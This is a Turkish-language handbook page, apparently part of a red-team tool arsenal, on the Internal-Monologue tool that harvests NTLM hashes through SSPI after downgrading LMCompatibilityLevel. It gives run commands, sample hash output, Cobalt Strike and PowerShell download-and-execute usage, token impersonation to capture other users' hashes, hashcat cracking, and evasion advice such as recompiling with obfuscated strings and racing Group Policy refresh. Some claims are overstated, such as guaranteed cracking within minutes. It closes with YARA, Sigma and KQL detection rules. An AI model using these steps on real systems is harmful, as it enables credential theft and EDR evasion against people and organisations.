# Internal-Monologue

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Elad Shamir (@elad_shamir) tarafından geliştirilen; LSASS sürecinin bellek alanına hiçbir tanıtıcı (handle) açmadan veya DLL enjekte etmeden, Güvenlik Desteği Sağlayıcısı Arabirimi (SSPI) üzerinden yerel bir NTLM kimlik doğrulama döngüsü başlatarak ve kayıt defterini geçici olarak NetNTLMv1 seviyesine düşürerek (Downgrade) aktif kullanıcıların parola karmalarını sessizce elde eden çığır açıcı kimlik hasat aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde uç nokta tespit ve müdahale (EDR) yazılımlarının en çok alarm ürettiği eylemlerin başında `lsass.exe` sürecine handle açılması (`PROCESS_VM_READ` veya `PROCESS_ALL_ACCESS`) ve bellek dökümü alınması (`MiniDumpWriteDump`) gelir. Savunma ekipleri Sysmon Event ID 10 ve EDR sürücü kancaları ile LSASS erişimlerini milisaniyeler içinde tespit edip süreci sonlandırır.

**`Internal-Monologue`**, bu soruna ezber bozan bir soruyla yaklaşmıştır: *"LSASS sürecine saldırmak veya belleğini okumak yerine; LSASS'ın meşru kimlik doğrulama mekanizmasını (SSPI) kullanarak parola karmasını kendi rızasıyla bize hesaplatıp teslim etmesini sağlayabilir miyiz?"*

Araç şu zekice mimari prensiplere dayanır:
1. **SSPI ile Yerel Kimlik Doğrulama:** Windows'un meşru Güvenlik Desteği Sağlayıcısı Arabirimi (SSPI) kullanılarak yerel `msv1_0.dll` paketi üzerinden mevcut kullanıcı oturumu için bir NTLM kimlik doğrulama isteği (`InitializeSecurityContext` / `AcquireCredentialsHandle`) başlatılır.
2. **Kayıt Defteri Düşürmesi (NetNTLMv1 Downgrade):** Windows varsayılan olarak NetNTLMv2 protokolünü kullanır. Araç, `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LMCompatibilityLevel` kayıt defteri değerini geçici olarak `0`, `1` veya `2` seviyesine çekerek işletim sistemini eski NetNTLMv1 yanıtı üretmeye zorlar.
3. **Sabit Sunucu Meydan Okuması (Static Challenge):** Ağ üzerinden geçen sahte bir SMB sunucusu taklit edilir ve LSASS'a sabit bir 8-baytlık meydan okuma (`1122334455667788`) sunulur.
4. **Zahmetsiz DES Kırımı:** NetNTLMv1 algoritması, kullanıcının NTLM hash'ini 3 parçaya bölüp her birini 7 baytlık DES anahtarlarıyla şifreler. Sabit challenge (`1122334455667788`) kullanıldığında bu NetNTLMv1 yanıtı, gökkuşağı tabloları (Rainbow Tables) veya online kırma servisleri (crack.sh) aracılığıyla **%100 kesinlikle dakikalar içinde doğrudan ham NTLM hash'ine dönüştürülür**.
5. **Anında Temizlik (Registry Restoration):** Yanıt alındığı anda kayıt defterindeki `LMCompatibilityLevel` değeri orijinal haline geri döndürülür.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / YÖNETİCİ KOMUT İSTEMİ (C# / IN-MEMORY)         │
│                                                                        │
│  [ InternalMonologue.exe ]                                             │
│         │                                                              │
│         ├── (1) Kayıt Defteri Yamalama: LMCompatibilityLevel = 2       │
│         │                                                              │
│         ├── (2) SSPI Çağrısı: AcquireCredentialsHandle()               │
│         │                                                              │
│         ├── (3) Sabit Meydan Okuma (Challenge) İletilir:               │
│         │       [ 1122334455667788 ]                                   │
│         │                                                              │
│         ├── (4) InitializeSecurityContext() ile Token Alınır           │
│         │         │                                                    │
│         │         ▼ (SSPI Yerel LPC İletişimi - Meşru Windows Çağrısı) │
│         │   [ lsass.exe / msv1_0.dll ]                                 │
│         │   └── NetNTLMv1 Yanıtını Hesaplar ve Güvenli Tokena Yazar    │
│         │                                                              │
│         ├── (5) NetNTLMv1 Hash'i Token İçinden Çekilir                 │
│         │                                                              │
│         └── (6) Kayıt Defteri Geri Yüklenir: LMCompatibilityLevel = 5  │
│                   │                                                    │
│                   ▼                                                    │
│  [ Çıktı: User::Domain:LM_Resp:NTLM_Resp:1122334455667788 ]            │
│  [ Hashcat / crack.sh ile NTLM Hash'e Çevrilir ]                       │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 NetNTLMv1 Kriptografik Zafiyeti ve crack.sh Entegrasyonu

NetNTLMv1 protokolü ciddi bir tasarım kusuruna sahiptir:
- Kullanıcının 16 baytlık (128-bit) NTLM hash'i 7'şer baytlık 3 parçaya ayrılır (son parçaya 2 bayt sıfır eklenir).
- Bu 3 anahtar, bağımsız 3 adet DES (Data Encryption Standard) şifrelemesinde anahtar olarak kullanılır.
- DES anahtar uzayı yalnızca $2^{56}$ olasılıktan oluşur. Bu boyut, modern GPU'lar veya önceden hesaplanmış Gökkuşağı Tabloları (Rainbow Tables) ile saniyeler içinde tüketilebilir.
- `Internal-Monologue`, sunucu meydan okumasını sabit `1122334455667788` olarak seçtiği için elde edilen NetNTLMv1 hash'i doğrudan `crack.sh` servisine veya yerel Hashcat'e (`-m 5500`) gönderilerek kullanıcının gerçek NTLM hash'i tam olarak geri elde edilir.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır LSASS Bellek Erişimi** | `lsass.exe` sürecine handle açmaz, bellek okumaz veya enjeksiyon yapmaz. | Sysmon Event ID 10 ve EDR bellek tarayıcılarını tamamen baypas eder. |
| **Sıfır Ağ İletişimi (Zero Network)** | Ağ üzerinden sahte SMB sunucusu (Responder/Inveigh) açmaya gerek duymaz. | Ağ tabanlı IDS/IPS ve Zeek/Suricata anomalilerini sıfıra indirir. |
| **Credential Guard Engeli Yok**| Credential Guard devredeyken dahi SSPI yerel NTLM yanıtı üretmeye devam eder. | LSASS bellek dökümü alınamayan ortamlarda NTLM hash elde etmeyi sağlar. |
| **Tüm Oturumları Kapsama** | Token Impersonation ile sistemdeki diğer kullanıcıların da hash'lerini hesaplatabilir. | Tek makinede birden fazla kullanıcının kimlik bilgisini toplar. |

### Karşılaştırma Tablosu

### 1.2 NTLM SSPI ve MSV1_0 Paketinin Yerel LPC Çağrı Akışı

Windows SSPI mekanizması, kullanıcı alanı uygulamalarının kimlik doğrulama işlemlerini güvenli bir şekilde `lsass.exe` sürecine devretmesini sağlar:
1. **`AcquireCredentialsHandleW`:** Süreç, `msv1_0` güvenlik paketine başvurarak mevcut oturumun (Current User) veya taklit edilen belirtecin (Impersonated Token) kimlik tanıtıcısını edinir.
2. **`InitializeSecurityContextW` (Tip 1 - NTLM Negotiate):** İstemci, desteklediği NTLM yeteneklerini içeren bir `NEGOTIATE_MESSAGE` paketi üretir.
3. **Meydan Okuma Simülasyonu (Tip 2 - NTLM Challenge):** Normalde bu mesaj bir SMB veya HTTP sunucusundan ağ üzerinden gelir. `Internal-Monologue`, ağa çıkmadan sahte bir `CHALLENGE_MESSAGE` paketini bellekte oluşturur ve içine sabit `1122334455667788` sunucu meydan okumasını yerleştirir.
4. **`InitializeSecurityContextW` (Tip 3 - NTLM Authenticate):** Sahte meydan okuma paketi yerel `msv1_0.dll`'e sunulur. LSASS, kullanıcının RAM'deki NTLM hash'ini kullanarak bu 8 baytlık meydan okumayı DES ile şifreler ve `AUTHENTICATE_MESSAGE` (NetNTLMv1 yanıtı) üretir. Bu yanıt doğrudan istemcinin tampon belleğine (buffer) geri döndürülür.

Böylece saldırgan, LSASS'ın belleğine tek bir zararlı okuma çağrısı dahi yapmadan tamamen meşru kimlik doğrulama fonksiyonları üzerinden hedef kullanıcının şifreli hash çıktısını almış olur.

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
InternalMonologue.exe [-Downgrade <True|False>] [-Restore <True|False>] [-Challenge <8_byte_hex>] [-Impersonate <True|False>]
```

PowerShell sürümünde:
```powershell
Invoke-InternalMonologue [-Downgrade] [-Restore] [-Challenge <hex>] [-Verbose]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Varsayılan Değer |
|---|---|---|
| `-Downgrade` | `LMCompatibilityLevel` kayıt defteri değerini geçici olarak 2'ye çeker. | `True` |
| `-Restore` | Hash alındıktan hemen sonra kayıt defteri değerini eski haline getirir. | `True` |
| `-Challenge` | SSPI kimlik doğrulamasında kullanılacak 8 baytlık (16 hex karakter) meydan okuma. | `1122334455667788` |
| `-Impersonate` | Sistemdeki diğer kullanıcı token'larını taklit ederek birden fazla hash toplar. | `True` |
| `-Verbose` | Ayrıntılı hata ayıklama ve SSPI aşama loglarını gösterir. | `False` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart NetNTLMv1 Downgrade ile Oturum Hash'ini Çekme

Yönetici haklarına sahip komut isteminde araç çalıştırılır; kayıt defteri düşürülür, SSPI ile NetNTLMv1 hash'i hesaplatılır ve kayıt defteri eski değerine döndürülür:

```cmd
InternalMonologue.exe
```

**Konsol Çıktısı Analizi:**

```text
[*] Internal Monologue by @elad_shamir
[*] Current LMCompatibilityLevel: 5
[*] Downgrading LMCompatibilityLevel to 2... OK
[*] Using NTLM Challenge: 1122334455667788
[*] Calling SSPI AcquireCredentialsHandle()... OK
[*] Calling InitializeSecurityContext()... OK
[+] NetNTLMv1 Response captured!

Username  : Administrator
Domain    : CORP
Challenge : 1122334455667788
Response  : 9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D1673A9F0E1B2C3D4

[+] Hashcat format (NetNTLMv1):
Administrator::CORP:9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D1673A9F0E1B2C3D4:9A8B7C6D5E4F3A2B1C0D9E8F7A6B5C4D1673A9F0E1B2C3D4:1122334455667788

[*] Restoring LMCompatibilityLevel to 5... OK
[+] Execution completed successfully!
```

---

### Senaryo 2: Cobalt Strike `execute-assembly` ile Dosyasız İcra

Saldırgan, kurban makinede hiçbir dosya oluşturmadan Beacon belleği üzerinden Internal-Monologue'u çalıştırır:

```text
beacon> execute-assembly /opt/InternalMonologue/InternalMonologue.exe -Verbose
```

---

### Senaryo 3: Token Impersonation ile Diğer Aktif Kullanıcıların Hash'lerini Alma

Sistemde oturum açmış diğer kullanıcıların (örneğin RDP ile bağlı bir Domain Admin) token'ları taklit edilerek onların adına NetNTLMv1 hesaplatma:

```cmd
InternalMonologue.exe -Impersonate True
```

---

### Senaryo 4: PowerShell Üzerinden Doğrudan Belleğe Yükleyerek Çalıştırma

PowerShell betiği doğrudan web üzerinden RAM'e indirilerek diske basılmadan tetiklenir:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/Invoke-InternalMonologue.ps1')
Invoke-InternalMonologue -Verbose
```

---

### Senaryo 5: Elde Edilen NetNTLMv1 Yanıtının Hashcat ile Kırılması

`1122334455667788` challenge'ı ile alınan hash doğrudan Hashcat'in NetNTLMv1 moduna (`-m 5500`) aktarılır:

```bash
hashcat -m 5500 -a 0 netntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

*Not: Eğer crack.sh veya özel gökkuşağı tabloları kullanılırsa, parolanın karmaşıklığı ne olursa olsun doğrudan 1-2 dakika içinde kullanıcının orijinal NTLM hash'i üretilir.*

---

### Senaryo 6: Acil Durumda Kayıt Defterini Manuel Eski Haline Getirme

Eğer süreç beklenmedik şekilde kesintiye uğrar ve kayıt defteri eski haline dönemezse operatörün manuel uygulayacağı onarım komutu:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel /t REG_DWORD /d 5 /f
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Registry access denied / Failed to modify LMCompatibilityLevel` | Komut istemi standart kullanıcı seviyesinde çalıştırıldı (`HKLM` yazma yetkisi yok). | Komut istemini "Yönetici Olarak Çalıştır" ile açın veya UAC Bypass uygulayın. |
| `LMCompatibilityLevel locked by Domain GPO` | Etki alanında uygulanan katı bir Grup İlkesi (GPO) kayıt defteri değerini sürekli `5` (Yalnızca NTLMv2) olarak zorluyor. | İlke yenileme döngüsü (90 dk) aralığında hızlıca çalıştırıp geri yükleyin veya yerel ilkeyi geçici olarak askıya alın. |
| `SSPI Error: SEC_E_TARGET_UNKNOWN` | Yerel NTLM sağlayıcısı SPN çözümlemesinde hata üretti. | Komutu parametresiz varsayılan localhost bağlamında çalıştırın. |
| `NTLM disabled completely / Kerberos Only` | Hedef sistemde NTLM kimlik doğrulaması GPO ile tamamen devre dışı bırakılmış (`Network security: Restrict NTLM`). | NTLM tamamen kapalıysa bu saldırı çalışmaz; Kerberos bilet saldırılarına (Rubeus) veya DPAPI kasa avına yönelin. |
| `Hashcat -m 5500 parsing error` | Çıktıdaki hash formatında challenge veya kullanıcı adı alanında ayrıştırma karakteri (`:`) fazladan bulundu. | Hash dizgisini `Username::Domain:LM_Resp:NTLM_Resp:Challenge` formatında tam 5 parça olacak şekilde düzenleyin. |
| `Registry left in insecure state (LMCompatibilityLevel=2)` | Süreç hata verdi ve `Restore` fonksiyonu çalışmadan kapandı. | Manuel olarak `reg add ... /d 5 /f` komutunu çalıştırarak sistemin NTLM seviyesini derhal 5'e geri getirin (Senaryo 6). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK - ORTA (LSASS ERİŞİMİ YOK - KAYIT DEFTERİ İZİ)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4657 (Registry Value Modified: LMCompatibilityLevel)
[ Sysmon ]          : Event ID 13 (RegistryValueModified: Lsa\LMCompatibilityLevel)
[ LSASS Durumu ]    : SIFIR HANDLE ERİŞİMİ (Sysmon Event ID 10 YOK)
[ Ağ İmzaları ]     : SIFIR AĞ TRAFİĞİ (Tüm işlemler yerel SSPI çağrısı)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4657 & Sysmon Event ID 13 (Registry Modification):**
   - Saldırının en temel göstergesidir:
     `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LMCompatibilityLevel` anahtarının `5` değerinden `2` değerine düşürülmesi ve saniyeler sonra tekrar `5` yapılması.
2. **Windows Security Event ID 4624 (Logon Type 2 - Interactive / SSPI):**
   - Yerel makinede kullanıcının kendi adına açtığı başarılı yerel NTLM kimlik doğrulama logu.
3. **LSASS Sürecinde İz Yoktur:**
   - LSASS sürecine hiçbir `OpenProcess` veya `MiniDumpWriteDump` çağrısı yapılmadığından, EDR'ların en hassas olduğu Sysmon Event ID 10 kuralı tetiklenmez.

### 5.2 Ağ ve EDR İmzaları

- **Ağ Trafiği Sıfırdır:** Responder gibi araçların aksine ağda hiçbir LLMNR/NBT-NS veya sahte SMB trafiği oluşmaz.
- **EDR Sezgisel Taramaları:** Gelişmiş EDR'lar (Defender for Endpoint, SentinelOne), `LMCompatibilityLevel` anahtarının anlık değiştirilmesini "Credential Theft Attempt" şüphesiyle izler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558** | Steal or Forge Kerberos Tickets / Credentials | Yerel kimlik doğrulama token'ı üzerinden NTLM yanıtı alma. |
| **T1112** | Modify Registry | `LMCompatibilityLevel` değerini düşürme ve geri yükleme. |
| **T1556** | Modify Authentication Process | NTLMv1 kimlik doğrulama döngüsünü zorlama. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Kayıt Defteri İzleme (Sysmon 13)** | `LMCompatibilityLevel` anahtarını izleyen katı SIEM kuralları varsa, kayıt defterini değiştirmeden mevcut seviyeyi kontrol edin; sistem zaten seviye 0, 1 veya 2'deyse `-Downgrade False` ile çalıştırın. |
| **Statik İkili İmzası** | Hazır derlenmiş `InternalMonologue.exe` ikilisini çalıştırmayın; kaynak kodundaki fonksiyon adlarını ve çıktı metinlerini karıştırıp yeniden derleyin. |
| **Kayıt Defterinin Açık Kalması** | Sürecin çökme ihtimaline karşı her zaman `-Restore True` parametresinin çalıştığından emin olun ve çıkışta anahtar değerini doğrulayın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Internal-Monologue C# Assembly İmzası:**

```yara
rule Suspicious_InternalMonologue_Assembly {
    meta:
        description = "Detects Internal-Monologue tool for NetNTLMv1 downgrade attacks"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "InternalMonologue" ascii wide nocase
        $s2 = "LMCompatibilityLevel" ascii wide
        $s3 = "AcquireCredentialsHandle" ascii wide
        $s4 = "1122334455667788" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```

**Sigma Kuralı — LMCompatibilityLevel Düşürme Tespiti (Sysmon Event ID 13):**

```yaml
title: Potential NetNTLMv1 Downgrade via LMCompatibilityLevel
status: experimental
description: Detects registry modification lowering LMCompatibilityLevel to enable NetNTLMv1 capture.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 13
    TargetObject|contains: '\Control\Lsa\LMCompatibilityLevel'
    Details|contains|any:
      - 'DWORD (0x00000000)'
      - 'DWORD (0x00000001)'
      - 'DWORD (0x00000002)'
  condition: selection
level: critical
```

**Microsoft Sentinel (KQL) — Kayıt Defterinde Şüpheli NTLM Seviyesi Değişikliği:**

```kql
DeviceRegistryEvents
| where RegistryKey has @"Control\Lsa" and RegistryValueName == "LMCompatibilityLevel"
| where ActionType == "RegistryValueSet"
| where RegistryValueData in ("0", "1", "2")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, RegistryKey, RegistryValueData
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Tam Otomatik NetNTLMv1 Hasadı
```cmd
InternalMonologue.exe
```
- **Ne Yapar?** Kayıt defterini seviye 2'ye çeker, sabit challenge ile kullanıcının NetNTLMv1 yanıtını alır ve kayıt defterini anında geri yükler.
- **Ne Zaman Kullanılır?** LSASS sürecine dokunmadan parola karması elde etmek için en sessiz saldırı olarak.
- **Parametreler:** Ek parametre gerektirmez, tüm akış otomatiktir.

### Komut 2: Cobalt Strike ile Bellek İçi Çalıştırma
```text
beacon> execute-assembly InternalMonologue.exe
```
- **Ne Yapar?** Aracı diske bırakmadan doğrudan Beacon belleği üzerinden yürütür.
- **Ne Zaman Kullanılır?** C2 operasyonlarında dosyasız yürütme için.
- **Parametreler:** `execute-assembly`: .NET bellek yükleme komutu.

### Komut 3: Özel Challenge Belirterek Çalıştırma
```cmd
InternalMonologue.exe -Challenge 0102030405060708
```
- **Ne Yapar?** Varsayılan `1122334455667788` yerine belirtilen 8 baytlık özel meydan okumayı kullanır.
- **Ne Zaman Kullanılır?** Özel kırma senaryolarında veya analiz amaçlı farklı challenge gerektiğinde.
- **Parametreler:** `-Challenge`: 16 karakterlik hex dizesi.

### Komut 4: Belirteç Taklidi ile Tüm Kullanıcıları Tarama
```cmd
InternalMonologue.exe -Impersonate True
```
- **Ne Yapar?** Sistemde oturumu bulunan diğer kullanıcıların token'larını taklit ederek hepsinin NetNTLMv1 hash'lerini çeker.
- **Ne Zaman Kullanılır?** Çok kullanıcılı sunucularda (Terminal Server vb.) toplu kimlik hasadı yaparken.
- **Parametreler:** `-Impersonate True`: Token taklit modunu açar.

### Komut 5: Kayıt Defterini Düşürmeden Çalıştırma (Zaten Seviye 1-2 ise)
```cmd
InternalMonologue.exe -Downgrade False
```
- **Ne Yapar?** Kayıt defterine dokunmadan doğrudan SSPI çağrısı yapar.
- **Ne Zaman Kullanılır?** Sistemde LMCompatibilityLevel zaten 0, 1 veya 2 olarak yapılandırılmış eski ortamlarda (Sıfır log).
- **Parametreler:** `-Downgrade False`: Kayıt defteri değişikliğini atlar.

### Komut 6: Ayrıntılı Hata Ayıklama Modu (Verbose)
```cmd
InternalMonologue.exe -Verbose True
```
- **Ne Yapar?** SSPI çağrılarının dönüş kodlarını ve token boyutlarını detaylı olarak ekrana basar.
- **Ne Zaman Kullanılır?** Kimlik doğrulama başarısız olduğunda kök nedeni saptamak için.
- **Parametreler:** `-Verbose True`: Detaylı çıktı bayrağı.

### Komut 7: PowerShell Sürümünü Bellekten Çalıştırma
```powershell
Invoke-InternalMonologue -Verbose
```
- **Ne Yapar?** PowerShell oturumunda yerel fonksiyon olarak Internal-Monologue'u icra eder.
- **Ne Zaman Kullanılır?** EXE çalıştırmanın yasaklı olduğu PowerShell ortamlarında.
- **Parametreler:** `Invoke-InternalMonologue`: PowerShell fonksiyon adı.

### Komut 8: Hashcat ile NetNTLMv1 Kırma Komutu
```bash
hashcat -m 5500 Administrator::CORP:9A8B...:9A8B...:1122334455667788 rockyou.txt
```
- **Ne Yapar?** Elde edilen NetNTLMv1 hash'ini yerel GPU gücüyle kırar.
- **Ne Zaman Kullanılır?** Hash toplandıktan sonra açık metin parolayı bulmak için.
- **Parametreler:** `-m 5500`: NetNTLMv1 hash modu.

### Komut 9: Kayıt Defteri Durumunu Manuel Sorgulama
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel
```
- **Ne Yapar?** Sistemdeki mevcut NTLM uyumluluk seviyesini doğrular.
- **Ne Zaman Kullanılır?** Saldırı öncesinde veya sonrasında değerin doğruluğunu kontrol etmek için.
- **Parametreler:** `reg query`: Kayıt defteri sorgulama aracı.

### Komut 10: Kayıt Defterini Güvenli Seviyeye Zorla Döndürme
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel /t REG_DWORD /d 5 /f
```
- **Ne Yapar?** LMCompatibilityLevel değerini zorla `5` (En güvenli NTLMv2 modu) yapar.
- **Ne Zaman Kullanılır?** Olası bir kesinti durumunda sistemi güvenceye almak için.
- **Parametreler:** `/d 5`: Değer 5, `/f`: Onay sorma.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [EladShamir / Internal-Monologue](https://github.com/EladShamir/Internal-Monologue)
- **Elad Shamir Araştırma Makalesi:** [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://eladshamir.com/2017/08/04/internal-monologue-attack-retrieving-ntlm-hashes-without-touching-lsass/)
- **MITRE ATT&CK Referansı:** [T1558 - Steal or Forge Kerberos/NTLM Credentials](https://attack.mitre.org/techniques/T1558/)
- **Microsoft Dokümantasyonu:** [LMCompatibilityLevel Registry Key Settings](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc960646(v=technet.10))

---

> **Önceki:** [← Seatbelt](./Seatbelt.md) · **Sonraki:** [lazagne →](./lazagne.md)
